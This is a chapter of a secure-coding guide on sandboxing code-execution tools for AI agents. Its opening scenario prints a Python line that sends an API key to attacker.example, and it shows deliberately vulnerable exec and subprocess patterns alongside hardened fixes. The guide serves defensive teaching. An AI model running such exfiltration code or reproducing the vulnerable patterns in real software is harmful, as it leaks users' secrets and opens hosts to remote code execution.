# Chapter 11 — Sandbox the Code

**Unexpected Code Execution Controls for AI Agents**

## The Scenario

Your coding agent can “run a quick Python snippet to verify the answer.” In the demo it feels magical. In production the model generates:

```python
import os, urllib.request
urllib.request.urlopen("https://attacker.example/exfil?k=" + os.environ["OPENAI_API_KEY"])
```

The interpreter runs on the agent host with full environment variables and outbound network. The key leaves your environment in one tool call. Nobody injected a prompt — **the tool itself was the RCE surface.**

---

## Why Code Execution Is Different

A file-read tool has a clear boundary (path). A code interpreter has an open-ended language runtime: files, network, subprocesses, reflection. Treat it as **remote code execution you invited in**, not as a helpful calculator.

---

## Vulnerable Pattern 1 — `exec` / `eval` on Model Output

```python
# ❌ VULNERABLE
def run_model_code(code: str) -> str:
    local = {}
    exec(code, {"__builtins__": __builtins__}, local)  # full builtins
    return str(local.get("result", ""))
```

```python
# ✅ Best Practice — refuse free-form exec; allow only a tiny expression subset
import ast

ALLOWED_NODES = (
    ast.Expression, ast.BinOp, ast.UnaryOp, ast.Constant,
    ast.Add, ast.Sub, ast.Mult, ast.Div, ast.Mod, ast.Pow,
    ast.USub, ast.UAdd,
)

def safe_calc(expr: str) -> float:
    tree = ast.parse(expr, mode="eval")
    for node in ast.walk(tree):
        if not isinstance(node, ALLOWED_NODES):
            raise ValueError(f"node_not_allowed: {type(node).__name__}")
    return float(eval(compile(tree, "<calc>", "eval"), {"__builtins__": {}}, {}))
```

---

## Vulnerable Pattern 2 — Unsandboxed Code Interpreter Tool

```python
# ❌ VULNERABLE — “code_interpreter” with host FS + network + env
def code_interpreter(code: str) -> str:
    import subprocess, textwrap, tempfile
    path = tempfile.NamedTemporaryFile("w", suffix=".py", delete=False)
    path.write(code); path.close()
    # Inherits full os.environ, full network, can read any file
    out = subprocess.run(["python", path.name], capture_output=True, text=True, timeout=60)
    return out.stdout + out.stderr
```

```python
# ✅ HARDENING STUB — isolated subprocess: slim env, no inherited secrets, timeouts
# Production still needs a real sandbox (gVisor/Firecracker/seccomp + deny-by-default network).
import subprocess, tempfile, textwrap, os
from pathlib import Path

def code_interpreter(code: str) -> str:
    if len(code) > 8_000:
        raise ValueError("code_too_large")
    with tempfile.TemporaryDirectory() as td:
        script = Path(td) / "main.py"
        script.write_text(textwrap.dedent(code))
        env = {"PATH": "/usr/bin:/bin", "HOME": td, "PYTHONSAFEPATH": "1"}
        out = subprocess.run(
            ["python", "-I", str(script)],  # -I: isolated mode (not a full sandbox)
            cwd=td,
            env=env,
            capture_output=True,
            text=True,
            timeout=5,
        )
        return (out.stdout + out.stderr)[:20_000]
```

---

## Vulnerable Pattern 3 — Host Secrets Inside the Interpreter

```python
# ❌ VULNERABLE — pass the whole environment “for convenience”
subprocess.run(["python", script], env=os.environ)
```

```python
# ✅ Best Practice — explicit allowlist; never provider keys / DB URLs
SAFE_ENV_KEYS = frozenset({"PATH", "HOME", "LANG", "TZ"})

def build_interpreter_env(base_home: str) -> dict[str, str]:
    return {k: os.environ[k] for k in SAFE_ENV_KEYS if k in os.environ} | {
        "HOME": base_home,
        "PYTHONSAFEPATH": "1",
    }
```

---

## The Four Interpreter Rules

1. **Prefer structured tools over code execution.** If the agent needs math, give a calculator — not Python.
2. **Default deny network and host FS.** Tempdir jail; no `os.environ` inheritance.
3. **Hard resource limits.** CPU time, wall clock, output size, memory (cgroups / container).
4. **Never let the model expand its own interpreter privileges.**

---

## Framework Variants

### LangChain

```python
from langchain_core.tools import tool

@tool
def calculate(expression: str) -> str:
    """Evaluate a simple arithmetic expression."""
    # Prefer AST-only tools (safe_calc) over free-form exec — see chapter body
    return str(safe_calc(expression))
```

### LangGraph

Keep a dedicated `sandbox_node` that only accepts an allowlisted tool name (`calculate` / `plot_csv`) — never a free-form `run_python` unless the deployment uses a **real** container sandbox (gVisor/Firecracker/seccomp + deny-by-default network). A slim `env=` + tempfile is hardening, not isolation.

### Raw OpenAI SDK

Expose `code_interpreter` only for tiers that require it, with server-side policy that swaps in the isolated runner from the chapter body. Do not claim an empty or slim `env` is a sandbox — host secrets may still be readable via FS unless the process is containerised.

---

## Try It Yourself → [Open Lab 11 locally](../labs/11-sandbox-the-code.ipynb)

1. Watch `exec` exfiltrate a fake API key  
2. Apply AST-only calculator  
3. Compare unsandboxed vs isolated subprocess env  
4. **Your turn:** implement `safe_calc` until asserts pass  

---

## Checklist

- [ ] Free-form `exec`/`eval` of model output is disabled (ASI05, CFG-D04)
- [ ] Code interpreter (if any) runs in an isolated process/container with deny-by-default network
- [ ] Host secrets are not passed into the interpreter environment (CFG-D07)
- [ ] Timeouts, output caps, and step budgets wrap every interpreter call (CFG-B10)
- [ ] High-risk code tools are off by default per role (CFG-D05)

---

## Key Takeaway

If the model can run arbitrary code on your infrastructure, prompt injection becomes remote code execution. **Sandbox or don’t ship the tool.**

---

## Next Chapter

**[Chapter 12 → Stop the Cascade](./12-stop-the-cascade.md)**  
How failures and poisoned results fan out across multi-agent systems — and how to contain them.

---

*OWASP references: [ASI05 Unexpected Code Execution](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) · [CFG-D04/D05/D07](../TEST-CATALOG.md) · [CFG-B10](../TEST-CATALOG.md)*
